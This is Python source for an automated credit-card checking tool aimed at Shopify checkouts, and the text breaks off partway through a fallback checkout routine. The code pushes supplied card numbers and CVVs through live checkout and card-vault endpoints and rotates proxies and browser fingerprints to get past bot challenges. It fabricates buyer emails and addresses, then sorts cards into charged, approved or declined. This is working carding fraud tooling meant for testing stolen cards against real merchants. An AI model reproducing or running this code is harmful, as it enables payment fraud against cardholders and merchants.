def _is_challenge_html(body):
    b = (body or "").lstrip().lower()
    return (b.startswith("<!doctype") or b.startswith("<html")
            or "verifying your connection" in b or "cf-chl-" in b
            or ("challenge" in b[:300] and '"id"' not in b))


def _send_pci(session, ident_sig, card, name, shop_domain, vault_url="", vault_domain="", proxy=None, build_hash="", proxies=None):
    scope = vault_domain or (shop_domain.replace("https://", "").replace("http://", "").split("/")[0] if shop_domain else "")
    shop_key = scope or shop_domain
    plist = [_norm_proxy(p) for p in (proxies or []) if _norm_proxy(p)]
    if not plist and proxy:
        plist = [_norm_proxy(proxy)]
    plist.append(None)

    candidates = []
    for ep in PCI_ENDPOINTS:
        if ep not in candidates:
            candidates.append(ep)
    cached = _VAULT_CACHE.get(shop_key)
    if cached and cached not in candidates:
        candidates.insert(0, cached)
    if vault_url and vault_url not in candidates:
        candidates.append(vault_url)

    pan = " ".join(card["number"][i:i+4] for i in range(0, len(card["number"]), 4))
    try:
        mm = int(card["month"])
    except (ValueError, TypeError):
        mm = 1
    try:
        yy = int(card["year"])
        if yy < 100:
            yy += 2000
    except (ValueError, TypeError):
        yy = 2028
    payload = json.dumps({"credit_card": {
        "number": pan, "month": mm, "year": yy,
        "verification_value": str(card["cvv"]), "start_month": None, "start_year": None,
        "issue_number": "", "name": name,
    }, "payment_session_scope": scope})

    def _try(ep, pxy):
        origin = ep.rsplit("/sessions", 1)[0]
        headers = {
            "accept": "application/json",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": origin,
            "pragma": "no-cache",
            "cache-control": "no-cache",
            "referer": f"{origin}/build/{build_hash or '27bcf73'}/number-ltr.html?identifier=&locationURL=",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "sec-fetch-storage-access": "active",
            "shopify-identification-signature": ident_sig or "",
            "user-agent": random.choice(USER_AGENTS),
        }
        try:
            r = session.post(ep, data=payload, headers=headers, proxy=pxy, timeout=10)
            return r.status_code, r.text
        except Exception as e:
            return 0, f"__NETERR__:{str(e)[:120]}"

    time.sleep(random.uniform(0.05, 0.25))
    last_status, last_body = 0, ""
    lanes = [p for p in plist if not _lane_cooling(p)]
    if not lanes:
        return 0, "__ALL_LANES_PARKED__"
    for _round in range(2):
        for pxy in lanes:
            for ep in candidates:
                status, body = _try(ep, pxy)
                if status == 200 and '"id"' in (body or ""):
                    if _round == 0:
                        _VAULT_CACHE[shop_key] = ep
                    _lane_recovered(pxy)
                    if pxy:
                        _remember_alive(pxy)
                    return status, body
                last_status, last_body = status, body
                if status in (403, 500, 502, 503) or (status == 200 and _is_challenge_html(body)):
                    _lane_burn(pxy, 60 if status == 403 else PCI_BURN_SECONDS)
                    break
                if status == 429:
                    time.sleep(random.uniform(0.4, 0.8))
                    break
        if _round == 0:
            time.sleep(0.5)
            lanes = [p for p in lanes if not _lane_cooling(p)]
            if not lanes:
                break
    return last_status, last_body


def _classify_verdict(body=""):
    u = (body or "").upper()
    if '"__TYPENAME":"PROCESSEDRECEIPT"' in u or '"__TYPENAME":"SUCCESSFULRECEIPT"' in u or '"__TYPENAME": "PROCESSEDRECEIPT"' in u or '"__TYPENAME": "SUCCESSFULRECEIPT"' in u:
        return "ORDER_PAID"
    if "FAILEDRECEIPT" in u or "PAYMENTFAILED" in u:
        m = re.search(r'"processingError"\s*:\s*\{\s*"code"\s*:\s*"([^"]+)"', body, re.IGNORECASE)
        return m.group(1) if m else "CARD_DECLINED"
    if any(k in u for k in ("ACTIONREQUIREDRECEIPT", "ACTION_REQUIRED", "ACTIONREQUIRED", "OTP_REQUIRED", "OTP",
                            "AUTHENTICATION_REQUIRED", "COMPLETEPAYMENTCHALLENGE", "THREE_D_SECURE", "THREEDS")):
        return "3DS_REQUIRED"
    if any(k in u for k in ("INSUFFICIENT_FUNDS", "INSUFFICIENT FUNDS", "INSUFFICIENTFUNDS", "INSUFFICIENT")):
        return "INSUFFICIENT_FUNDS"
    if any(k in u for k in ("INCORRECT_CVC", "INVALID_CVC", "INCORRECT_CVV", "INVALID_CVV",
                            "INCORRECT_SECURITY_CODE", "INVALID_SECURITY_CODE",
                            "INCORRECT CVV", "INVALID CVV", "INCORRECT CVC", "INVALID CVC",
                            "INCORRECT SECURITY CODE", "INVALID SECURITY CODE",
                            "SECURITY CODE IS INCORRECT", "SECURITY CODE IS INVALID",
                            "SECURITY CODE DOESN'T MATCH", "SECURITY CODE DOES NOT MATCH")):
        return "INCORRECT_CVC"
    if any(k in u for k in ("INCORRECT_ZIP", "INCORRECT_POSTAL", "INCORRECTZIP", "INCORRECTPOSTAL",
                            "INCORRECT ZIP", "INCORRECT POSTAL", "INVALID ZIP", "INVALID POSTAL",
                            "INVALID_ZIP", "INVALID_POSTAL", "INVALIDZIP", "INVALIDPOSTAL")):
        return "INCORRECT_ZIP"
    if '"CODE":"CAPTCHA_REQUIRED"' in u or re.search(r'"captcha"\s*:\s*\{', body, re.IGNORECASE):
        return "CAPTCHA_REQUIRED"
    if "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT" in u:
        return "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT"
    if any(k in u for k in ("INCORRECT_NUMBER", "INVALID_NUMBER", "INCORRECTNUMBER", "INVALIDNUMBER",
                            "INCORRECT NUMBER", "INVALID NUMBER", "INCORRECT CARD NUMBER", "INVALID CARD NUMBER")):
        return "INCORRECT_NUMBER"
    if any(k in u for k in ("CARD_EXPIRED", "EXPIRED_CARD", "CARD EXPIRED", "EXPIRED CARD",
                            "PAYMENTS_CREDIT_CARD_BASE_EXPIRED", "EXPIRED")):
        return "CARD_EXPIRED"
    if any(k in u for k in ("DO_NOT_HONOR", "DONOTHONOR", "DO NOT HONOR")):
        return "DO_NOT_HONOR"
    if any(k in u for k in ("STOLEN CARD", "LOST CARD", "PICKUP CARD")):
        return "STOLEN_CARD"
    if any(k in u for k in ("FRAUD", "SUSPECTED FRAUD")):
        return "FRAUD_DECLINED"
    if any(k in u for k in ("RISK_REJECTED", "RISKY")):
        return "RISK_DECLINED"
    if any(k in u for k in ("INVALID CARD", "INVALID_CARD", "INVALIDCARD")):
        return "INVALID_CARD"
    if any(k in u for k in ("PROCESSING_ERROR", "FUNDING_ERROR")):
        return "PROCESSING_ERROR"
    if any(k in u for k in ("CARD_DECLINED", "CARDDECLINED", "CARD DECLINED", "DECLINED")):
        return "CARD_DECLINED"
    return ""


def _verdict_status(code):
    if code == "ORDER_PAID":
        return "charged"
    if code in ("INSUFFICIENT_FUNDS", "3DS_REQUIRED"):
        return "approved"
    return "declined"


def _submit_result(body):
    try:
        data = json.loads(body)
        sub = data.get("data", {}).get("submitForCompletion", {})
        typename = sub.get("__typename", "")
        receipt_id = (sub.get("receipt") or {}).get("id", "") if isinstance(sub.get("receipt"), dict) else ""
        errors = [e.get("code", "") for e in sub.get("errors", []) if isinstance(e, dict)]
        seller = sub.get("sellerProposal") or {}
        return typename, receipt_id, errors, seller
    except Exception:
        return "", "", [], {}


def _seller_total(body):
    seller = body if isinstance(body, dict) else _seller_proposal(body)
    for key in ("checkoutTotal", "total", "runningTotal"):
        v = seller.get(key) or {}
        if isinstance(v, dict):
            amt = (v.get("value") or {}).get("amount", "")
            if amt:
                return amt
    return ""


def _seller_tax(body):
    seller = body if isinstance(body, dict) else _seller_proposal(body)
    v = seller.get("tax") or {}
    if isinstance(v, dict):
        return (v.get("totalTaxAmount") or {}).get("value", {}).get("amount", "0.0") or "0.0"
    return "0.0"


def _extract_any_error(body):
    for pat in [r'"nonLocalizedMessage"\s*:\s*"([^"]+)"', r'"localizedMessage"\s*:\s*"([^"]+)"',
                r'"code"\s*:\s*"([^"]+)"', r'"message"\s*:\s*"([^"]+)"']:
        m = re.search(pat, body or "")
        if m:
            return m.group(1)
    return ""


def persisted_checkout(shop_url, variant, card, email, shipping, billing, currency, country, proxy, checkout_url_override="", dynamic_ids=True, proxies=None):
    variant_id = variant["variant_id"]
    price = f"{variant['price']:.2f}"
    proxy_url = _norm_proxy(proxy or None)
    plist = [_norm_proxy(p) for p in proxies] if proxies else ([proxy_url] if proxy_url else None)

    with curl_requests.Session(impersonate=random.choice(BROWSER_PROFILES)) as session:
        session.timeout = 10
        checkout_url, checkout_html = "", ""

        if checkout_url_override:
            try:
                r = session.get(checkout_url_override, allow_redirects=True, proxy=proxy_url)
                checkout_url, checkout_html = str(r.url), r.text
            except Exception:
                pass

        if "/checkouts/cn/" not in checkout_url or "serialized-sessionToken" not in checkout_html:
            checkout_url, checkout_html = _checkout_init(session, shop_url, variant_id, country, proxy_url)

        checkout_token = _extract(checkout_url, r'/checkouts/cn/([^/?]+)')
        session_token = htmllib.unescape(_extract(checkout_html, r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"')).strip('"')
        if not checkout_token or not session_token:
            return {"status": "error", "step": "checkout_init", "error": "no token/session", "url": checkout_url}

        decoded = htmllib.unescape(checkout_html)
        stable_id = _extract(decoded, r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"')
        build_id = _extract(decoded, r'"commitSha"\s*:\s*"([a-f0-9]{40})"')
        source_token = htmllib.unescape(_extract(checkout_html, r'<meta\s+name="serialized-sourceToken"\s+content="([^"]*)"')).strip('"')
        ident_sig = _extract(checkout_html.replace('&quot;', '"'), r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"')
        vault_url = _extract(checkout_html.replace('&quot;', '"'), r'(https://[a-z0-9._-]*(?:shopifycs|shopifyinc)\.[a-z.]+/sessions)')
        vault_domain = _extract_vault_domain(checkout_html)
        pci_build = _extract_pci_build_hash(checkout_html)

        if not stable_id or not source_token:
            return {"status": "error", "step": "extract", "error": f"stable_id={bool(stable_id)} source_token={bool(source_token)}"}

        proposal_id, submit_id, poll_id = PROPOSAL_ID, SUBMIT_ID, POLL_ID
        if dynamic_ids:
            actions_url = _extract_actions_js_url(checkout_html, shop_url)
            if actions_url:
                if actions_url in _ID_CACHE:
                    proposal_id, submit_id, poll_id = _ID_CACHE[actions_url]
                else:
                    try:
                        js_body = session.get(actions_url, headers={
                            "accept": "*/*", "origin": shop_url, "referer": checkout_url,
                            "user-agent": random.choice(USER_AGENTS)}, proxy=proxy_url).text
                        _p = _extract_js_id(js_body, "Proposal", "query")
                        _s = _extract_js_id(js_body, "SubmitForCompletion", "mutation")
                        _pl = _extract_js_id(js_body, "PollForReceipt", "query")
                        if _p:
                            proposal_id = _p
                        if _s:
                            submit_id = _s
                        if _pl:
                            poll_id = _pl
                        _ID_CACHE[actions_url] = (proposal_id, submit_id, poll_id)
                    except Exception:
                        pass

        addr = shipping or {}
        captcha = None

        # proposal 1 — queue token + currency/country
        status, body = _send_proposal(session, shop_url, checkout_url, checkout_token, session_token,
                                      build_id, source_token,
                                      _build_proposal_variables(session_token, None, stable_id, variant_id,
                                                                "", addr, currency, country, captcha),
                                      proposal_id=proposal_id, proxies=plist)
        if status != 200:
            return {"status": "error", "step": "proposal1", "http": status, "error": body[:200]}
        queue_token = _extract(body, r'"queueToken"\s*:\s*"([^"]+)"')
        if not queue_token:
            return {"status": "error", "step": "proposal1", "error": "no queueToken", "body": body[:300]}

        _cur = _extract_supported_currency(body)
        _ctr = _extract_supported_country(body)
        _gateway = _extract_gateway(body)
        if _cur and _cur != currency:
            currency = _cur
        if _ctr and _ctr != country:
            country = _ctr
        addr = shipping if shipping.get("countryCode", "") == country else random_address(country)
        time.sleep(0.3)

        # proposal 2 — email + address, retry until delivery handle or 3 tries
        proposal_body = body
        queue_token2 = ""
        for _attempt, _delay in enumerate([0.2, 0.4, 0.8], start=1):
            status, proposal_body = _send_proposal(session, shop_url, checkout_url, checkout_token, session_token,
                                                   build_id, source_token,
                                                   _build_proposal_variables(session_token, queue_token, stable_id, variant_id,
                                                                             email, addr, currency, country, captcha,
                                                                             email_changed=(_attempt == 1)),
                                                   proposal_id=proposal_id, proxies=plist)
            if status != 200:
                return {"status": "error", "step": "proposal2", "http": status, "error": proposal_body[:200]}
            queue_token2 = _extract(proposal_body, r'"queueToken"\s*:\s*"([^"]+)"') or queue_token
            if '"PendingTerms"' not in proposal_body and _extract_delivery_handle(proposal_body):
                break
            if _attempt < 3:
                time.sleep(_delay)
        if not queue_token2:
            queue_token2 = queue_token

        total_amount = _extract_total(proposal_body) or price
        tax_amount = _extract_tax(proposal_body)
        delivery_handle = _extract_delivery_handle(proposal_body)
        signed_handles = _extract_signed_handles(proposal_body)
        is_digital = not _extract_is_shipping_required(proposal_body)
        payment_method_id = _extract_payment_method_id(proposal_body) or _extract_payment_method_id(body)
        flexibility_terms_id = _extract_payment_flexibility_terms_id(proposal_body)
        card_bin = str(card["number"])[:8]
        card_name = f"{addr.get('firstName', '')} {addr.get('lastName', '')}".strip() or "Card Holder"

        status, pci_body = _send_pci(session, ident_sig, card, card_name, shop_url,
                                     vault_url=vault_url, vault_domain=vault_domain, proxy=proxy_url,
                                     build_hash=pci_build, proxies=plist)
        if status != 200:
            return {"status": "error", "step": "pci", "http": status, "error": pci_body[:200]}
        pci_session_id = _extract(pci_body, r'"id"\s*:\s*"([^"]+)"')
        if not pci_session_id:
            return {"status": "error", "step": "pci", "error": "no session id", "body": pci_body[:200]}

        addr1 = addr.get("address1", ""); addr2 = addr.get("address2", ""); city = addr.get("city", "")
        postal = addr.get("zip", ""); first = addr.get("firstName", ""); last = addr.get("lastName", "")
        zone = addr.get("state", ""); phone = addr.get("phone", ""); cc = addr.get("countryCode", country)

        if is_digital:
            delivery_block = {
                "deliveryLines": [{
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyMatchingConditions": {
                            "estimatedTimeInTransit": {"any": True}, "shipments": {"any": True},
                        },
                        "options": {},
                    },
                    "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                    "deliveryMethodTypes": ["NONE"],
                    "expectedTotalPrice": {"any": True},
                    "destinationChanged": True,
                }],
                "noDeliveryRequired": [], "useProgressiveRates": False,
                "prefetchShippingRatesStrategy": None, "supportsSplitShipping": True,
            }
            delivery_expectations = {"deliveryExpectationLines": []}
        else:
            delivery_block = {
                "deliveryLines": [{
                    "destination": {"streetAddress": {
                        "address1": addr1, "address2": addr2, "city": city, "countryCode": cc, "postalCode": postal,
                        "firstName": first, "lastName": last, "zoneCode": zone, "phone": phone, "oneTimeUse": False,
                    }},
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyByHandle": {"handle": delivery_handle, "customDeliveryRate": False},
                        "options": {"phone": phone},
                    },
                    "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                    "deliveryMethodTypes": ["SHIPPING"],
                    "expectedTotalPrice": {"any": True},
                    "destinationChanged": False,
                }],
                "noDeliveryRequired": [], "useProgressiveRates": False,
                "prefetchShippingRatesStrategy": None, "supportsSplitShipping": True,
            }
            delivery_expectations = {"deliveryExpectationLines": [{"signedHandle": h} for h in signed_handles]}

        attempt_token = f"{checkout_token}-{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))}"
        page_id = f"{random.getrandbits(64):016x}"

        submit_variables = {
            "input": {
                "sessionInput": {"sessionToken": session_token},
                "queueToken": queue_token2,
                "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                "delivery": delivery_block,
                "deliveryExpectations": delivery_expectations,
                "merchandise": {
                    "merchandiseLines": [{
                        "stableId": stable_id,
                        "merchandise": {
                            "productVariantReference": {
                                "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                                "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                                "properties": [], "sellingPlanId": None, "sellingPlanDigest": None,
                            }
                        },
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {"any": True},
                        "lineComponentsSource": None, "lineComponents": [],
                    }]
                },
                "memberships": {"memberships": []},
                "payment": {
                    "totalAmount": {"value": {"amount": total_amount, "currencyCode": currency}},
                    "paymentLines": [{
                        "paymentMethod": {
                            "directPaymentMethod": {
                                "paymentMethodIdentifier": payment_method_id,
                                "sessionId": pci_session_id,
                                "billingAddress": {"streetAddress": {
                                    "address1": addr1, "address2": addr2, "city": city, "countryCode": cc, "postalCode": postal,
                                    "firstName": first, "lastName": last, "zoneCode": zone, "phone": phone,
                                }},
                                "cardSource": None,
                            },
                            "giftCardPaymentMethod": None,
                            "ownedGiftCardPaymentMethod": None,
                            "redeemablePaymentMethod": None,
                            "walletPaymentMethod": None,
                            "walletsPlatformPaymentMethod": None,
                            "localPaymentMethod": None,
                            "paymentOnDeliveryMethod": None,
                            "paymentOnDeliveryMethod2": None,
                            "manualPaymentMethod": None,
                            "customPaymentMethod": None,
                            "offsitePaymentMethod": None,
                            "customOnsitePaymentMethod": None,
                            "deferredPaymentMethod": None,
                            "customerCreditCardPaymentMethod": None,
                            "paypalBillingAgreementPaymentMethod": None,
                            "remotePaymentInstrument": None,
                        },
                        "amount": {"value": {"amount": total_amount, "currencyCode": currency}},
                    }],
                    "billingAddress": {"streetAddress": {
                        "address1": addr1, "address2": addr2, "city": city, "countryCode": cc, "postalCode": postal,
                        "firstName": first, "lastName": last, "zoneCode": zone, "phone": phone,
                    }},
                    "creditCardBin": card_bin,
                    "allowStoreCredit": False,
                },
                "buyerIdentity": {
                    "customer": {"presentmentCurrency": currency, "countryCode": country},
                    "email": email, "emailChanged": False, "phoneCountryCode": country,
                    "marketingConsent": [], "shopPayOptInPhone": {"countryCode": country}, "rememberMe": False,
                },
                "tip": {"tipLines": []},
                "poNumber": None,
                "taxes": {
                    "proposedAllocations": None,
                    "proposedTotalAmount": {"value": {"amount": tax_amount, "currencyCode": currency}},
                    "proposedTotalIncludedAmount": None,
                    "proposedMixedStateTotalAmount": None,
                    "proposedExemptions": [],
                },
                "note": {"message": None, "customAttributes": []},
                "localizationExtension": {"fields": []},
                "nonNegotiableTerms": None,
                "scriptFingerprint": {
                    "signature": None, "signatureUuid": None,
                    "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": [],
                },
                "optionalDuties": {"buyerRefusesDuties": False},
                "cartMetafields": [],
            },
            "attemptToken": attempt_token,
            "metafields": [],
            "analytics": {"requestUrl": checkout_url, "pageId": page_id},
        }

        if flexibility_terms_id:
            submit_variables["input"]["payment"]["paymentFlexibilityTermsId"] = flexibility_terms_id

        submit_payload = json.dumps({"variables": submit_variables, "operationName": "SubmitForCompletion", "id": submit_id})

        receipt_id, receipt_session_token = "", ""
        submit_body, submit_status = "", 0
        cur_tax, cur_total = tax_amount, total_amount
        submit_headers = _proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)

        for attempt in range(8):
            submit_status, submit_body = _post_retry(
                session, f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
                proxies=plist, data=submit_payload, headers=submit_headers)
            if submit_status == 0:
                continue
            if submit_status in (429, 403) or submit_status >= 500:
                doc = _GQL.get("submit")
                if doc and attempt < 6:
                    fb = json.dumps({"operationName": "SubmitForCompletion", "variables": submit_variables, "query": doc})
                    submit_status, submit_body = _post_retry(
                        session, f"{shop_url}/checkouts/unstable/graphql?operationName=SubmitForCompletion",
                        proxies=plist, data=fb, headers=submit_headers)
                    if submit_status != 200:
                        time.sleep(random.uniform(0.8, 1.4))
                        continue
                else:
                    time.sleep(random.uniform(0.8, 1.4))
                    continue
            if submit_status != 200:
                return {"status": "error", "step": "submit", "http": submit_status, "error": submit_body[:300]}

            typename, receipt_id, errors, seller = _submit_result(submit_body)
            err_str = " ".join(errors)

            if typename == "SubmitRejected" and any("TAX" in e for e in errors):
                new_total = _seller_total(seller)
                new_tax = _seller_tax(seller)
                if new_total:
                    cur_total = new_total
                if new_tax:
                    cur_tax = new_tax
                submit_variables["input"]["taxes"]["proposedTotalAmount"] = {"value": {"amount": cur_tax, "currencyCode": currency}}
                submit_variables["input"]["payment"]["totalAmount"] = {"value": {"amount": cur_total, "currencyCode": currency}}
                submit_variables["input"]["payment"]["paymentLines"][0]["amount"] = {"value": {"amount": cur_total, "currencyCode": currency}}
                submit_payload = json.dumps({"variables": submit_variables, "operationName": "SubmitForCompletion", "id": submit_id})
                continue

            if typename == "SubmitRejected" and "DELIVERY" in err_str:
                new_handle, new_signed, new_total = "", [], ""
                de_typename = ""
                dlv = seller.get("delivery", {})
                for line in dlv.get("deliveryLines", []):
                    h = line.get("selectedDeliveryStrategy", {}).get("handle", "")
                    if h:
                        new_handle = h
                        break
                if not new_handle:
                    new_handle = dlv.get("selectedDeliveryStrategy", {}).get("handle", "")
                de = seller.get("deliveryExpectations", {})
                de_typename = de.get("__typename", "")
                if de_typename == "FilledDeliveryExpectationTerms":
                    new_signed = [x["signedHandle"] for x in de.get("deliveryExpectations", []) if x.get("signedHandle")]
                for key in ("checkoutTotal", "total", "runningTotal"):
                    v = seller.get(key) or {}
                    if isinstance(v, dict):
                        amt = (v.get("value") or {}).get("amount", "")
                        if amt:
                            new_total = amt
                            break
                if new_handle or new_total or de_typename:
                    if new_handle:
                        submit_variables["input"]["delivery"]["deliveryLines"][0]["selectedDeliveryStrategy"]["deliveryStrategyByHandle"]["handle"] = new_handle
                    if de_typename in ("UnavailableTerms", "FilledDeliveryTerms", "PendingTerms"):
                        submit_variables["input"]["deliveryExpectations"]["deliveryExpectationLines"] = []
                    elif new_signed:
                        submit_variables["input"]["deliveryExpectations"]["deliveryExpectationLines"] = [{"signedHandle": h} for h in new_signed]
                    if new_total:
                        cur_total = new_total
                        submit_variables["input"]["payment"]["totalAmount"] = {"value": {"amount": cur_total, "currencyCode": currency}}
                        submit_variables["input"]["payment"]["paymentLines"][0]["amount"] = {"value": {"amount": cur_total, "currencyCode": currency}}
                    submit_payload = json.dumps({"variables": submit_variables, "operationName": "SubmitForCompletion", "id": submit_id})
                    continue

            if typename == "SubmitRejected" and "PAYMENT_FLEXIBILITY" in err_str:
                ftid = _extract_payment_flexibility_terms_id(json.dumps({"data": {"submitForCompletion": {"sellerProposal": seller}}}))
                if ftid:
                    submit_variables["input"]["payment"]["paymentFlexibilityTermsId"] = ftid
                    submit_payload = json.dumps({"variables": submit_variables, "operationName": "SubmitForCompletion", "id": submit_id})
                    continue

            if typename == "SubmitRejected" and "CURRENCY" in err_str:
                sc = _extract_supported_currency(json.dumps({"data": {"submitForCompletion": {"sellerProposal": seller}}}))
                if sc and sc != currency:
                    currency = sc
                    submit_variables["input"]["buyerIdentity"]["customer"]["presentmentCurrency"] = currency
                    submit_variables["input"]["payment"]["totalAmount"]["value"]["currencyCode"] = currency
                    submit_variables["input"]["payment"]["paymentLines"][0]["amount"]["value"]["currencyCode"] = currency
                    submit_payload = json.dumps({"variables": submit_variables, "operationName": "SubmitForCompletion", "id": submit_id})
                    continue

            if typename == "SubmitRejected" and "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT" in err_str:
                new_total = _seller_total(seller)
                new_tax = _seller_tax(seller)
                if new_total:
                    cur_total = new_total
                    submit_variables["input"]["payment"]["totalAmount"] = {"value": {"amount": cur_total, "currencyCode": currency}}
                    submit_variables["input"]["payment"]["paymentLines"][0]["amount"] = {"value": {"amount": cur_total, "currencyCode": currency}}
                if new_tax:
                    cur_tax = new_tax
                    submit_variables["input"]["taxes"]["proposedTotalAmount"] = {"value": {"amount": cur_tax, "currencyCode": currency}}
                submit_payload = json.dumps({"variables": submit_variables, "operationName": "SubmitForCompletion", "id": submit_id})
                continue

            if not receipt_id and "GENERIC_ERROR" in err_str and attempt < 7:
                submit_variables["attemptToken"] = f"{checkout_token}-{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))}"
                submit_payload = json.dumps({"variables": submit_variables, "operationName": "SubmitForCompletion", "id": submit_id})
                continue

            break

        if not receipt_id:
            code = _classify_verdict(submit_body)
            if code and code != "ORDER_PAID":
                return {"status": _verdict_status(code), "code": code, "step": "submit",
                        "gate": _gateway, "amount": cur_total}
            if "SubmitSuccess" in submit_body:
                return {"status": "charged", "code": "ORDER_PAID", "step": "submit",
                        "gate": _gateway, "amount": cur_total}
            typename, _, errors, _ = _submit_result(submit_body)
            err = errors[0] if errors else ""
            if not err:
                err = _extract_any_error(submit_body)
            if "CAPTCHA" in (err or ""):
                err = "CARD_DECLINED"
            if err:
                return {"status": "declined", "code": err, "step": "submit",
                        "gate": _gateway, "amount": cur_total, "raw": submit_body[:2500]}
            return {"status": "error", "code": "SUBMIT_ERROR", "step": "submit", "gate": _gateway,
                    "error": submit_body[:400], "amount": cur_total}

        receipt_session_token = _extract(submit_body, r'"sessionToken"\s*:\s*"([^"]+)"')

        submit_verdict = _classify_verdict(submit_body)
        if submit_verdict and submit_verdict != "ORDER_PAID":
            return {"status": _verdict_status(submit_verdict), "code": submit_verdict,
                    "gate": _gateway, "amount": cur_total}

        poll_params = urllib.parse.urlencode({
            "operationName": "PollForReceipt",
            "variables": json.dumps({"receiptId": receipt_id, "sessionToken": receipt_session_token or session_token}),
            "id": poll_id,
        })
        poll_headers = dict(submit_headers)
        poll_headers["x-checkout-web-source-id"] = checkout_token

        last_poll = ""
        generic_retried = False
        for _ in range(10):
            poll_status, poll_body = _get_retry(
                session, f"{shop_url}/checkouts/internal/graphql/persisted?{poll_params}",
                proxies=plist, headers=poll_headers)
            if poll_status in (429, 403) or poll_status >= 500:
                doc = _GQL.get("poll")
                if doc:
                    fb = json.dumps({"operationName": "PollForReceipt",
                                     "variables": {"receiptId": receipt_id,
                                                   "sessionToken": receipt_session_token or session_token},
                                     "query": doc})
                    poll_status, poll_body = _post_retry(
                        session, f"{shop_url}/checkouts/unstable/graphql?operationName=PollForReceipt",
                        proxies=plist, data=fb, headers=poll_headers)
            if poll_status != 200:
                continue
            last_poll = poll_body
            code = _classify_verdict(poll_body)
            if code:
                if code == "GENERIC_ERROR" and not generic_retried:
                    generic_retried = True
                    submit_variables["attemptToken"] = f"{checkout_token}-{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))}"
                    submit_payload = json.dumps({"variables": submit_variables, "operationName": "SubmitForCompletion", "id": submit_id})
                    s2, b2 = _post_retry(
                        session, f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
                        proxies=plist, data=submit_payload, headers=submit_headers)
                    if s2 == 200:
                        _rid = _extract(b2, r'"receipt"\s*:\s*\{\s*"id"\s*:\s*"([^"]+)"')
                        if _rid:
                            receipt_id = _rid
                            _rst = _extract(b2, r'"sessionToken"\s*:\s*"([^"]+)"')
                            if _rst:
                                receipt_session_token = _rst
                            poll_params = urllib.parse.urlencode({
                                "operationName": "PollForReceipt",
                                "variables": json.dumps({"receiptId": receipt_id, "sessionToken": receipt_session_token or session_token}),
                                "id": poll_id,
                            })
                        continue
                order_id = _extract(poll_body, r'"order"\s*:\s*\{\s*"id"\s*:\s*"([^"]+)"')
                return {"status": _verdict_status(code), "code": code, "order_id": order_id,
                        "gate": _gateway, "amount": cur_total, "raw": poll_body[:2500] if code == "GENERIC_ERROR" else ""}
            m = re.search(r'"pollDelay"\s*:\s*(\d+)', poll_body)
            delay = int(m.group(1)) if m else 500
            time.sleep(min(delay, 250) / 1000.0)

        if re.search(r'action|challenge|3ds|three_d_secure|pending|authentication', last_poll or "", re.IGNORECASE):
            return {"status": "approved", "code": "3DS_REQUIRED", "receipt_id": receipt_id, "gate": _gateway}
        return {"status": "error", "code": "POLL_TIMEOUT", "receipt_id": receipt_id, "gate": _gateway}


def legacy_checkout(shop_url, variant, card, proxy=None):
    """Classic checkout fallback (gate.py flow) — no proposals, no ident sig.
    cart/add.js -> authenticity_token -> PATCH steps -> legacy vault
    (deposit.us.shopifycs.com, plain card form) -> final PATCH -> verdict."""
    proxy_url = _norm_proxy(proxy or None)
    webname = shop_url.replace("https://", "").replace("http://", "").split("/")[0]
    email = generate_random_email()
    addr = random_address("US")
    with curl_requests.Session(impersonate=random.choice(BROWSER_PROFILES)) as s:
        s.timeout = 12
        if proxy_url:
            s.proxies = {"http": proxy_url, "https": proxy_url}
        try:
            # 1. add to cart
            r1 = s.post(f"{shop_url}/cart/add.js", data={"id": variant["variant_id"], "quantity": 1},
                        headers={"x-requested-with": "XMLHttpRequest", "accept": "application/json",
                                 "referer": shop_url + "/"})
            if r1.status_code not in (200, 201):
                return {"status": "error", "step": "legacy_cart", "error": f"add.js {r1.status_code}"}
            # 2. enter checkout
            r2 = s.get(f"{shop_url}/checkout", allow_redirects=True)
            if "/checkouts/" not in (r2.url or ""):
                return {"status": "error", "step": "legacy_checkout", "error": "no /checkouts/ url"}
            checkout_url = r2.url
            # 3. authenticity token
            r3 = s.get(checkout_url)
            m = re.search(r'<input type="hidden" name="authenticity_token" value="([^"]+)"', r3.text)
            if not m:
                return {"status": "error", "step": "legacy_token", "error": "no authenticity_token (modern-only shop)"}
            authenticity = htmllib.unescape(m.group(1))
            # 4. contact + shipping step
            contact = {
                "_method": "patch", "authenticity_token": authenticity,
                "previous_step": "contact_information", "step": "shipping_method",
                "checkout[email]": email, "checkout[buyer_accepts_marketing]": "0",
                "checkout[shipping_address][first_name]": addr["firstName"],
                "checkout[shipping_address][last_name]": addr["lastName"],
                "checkout[shipping_address][address1]": addr["address1"],
                "checkout[shipping_address][address2]": addr["address2"],
                "checkout[shipping_address][city]": addr["city"],
                "checkout[shipping_address][country]": addr["countryCode"],
                "checkout[shipping_address][province]": addr["state"],
                "checkout[shipping_address][zip]": addr["zip"],
                "checkout[shipping_address][phone]": addr["phone"],
                "checkout[note]": "",
                "checkout[client_details][browser_width]": str(random.randint(1200, 1600)),
                "checkout[client_details][browser_height]": str(random.randint(600, 900)),
                "checkout[client_details][javascript_enabled]": "1",
                "checkout[client_details][color_depth]": "24",
                "checkout[client_details][java_enabled]": "false",
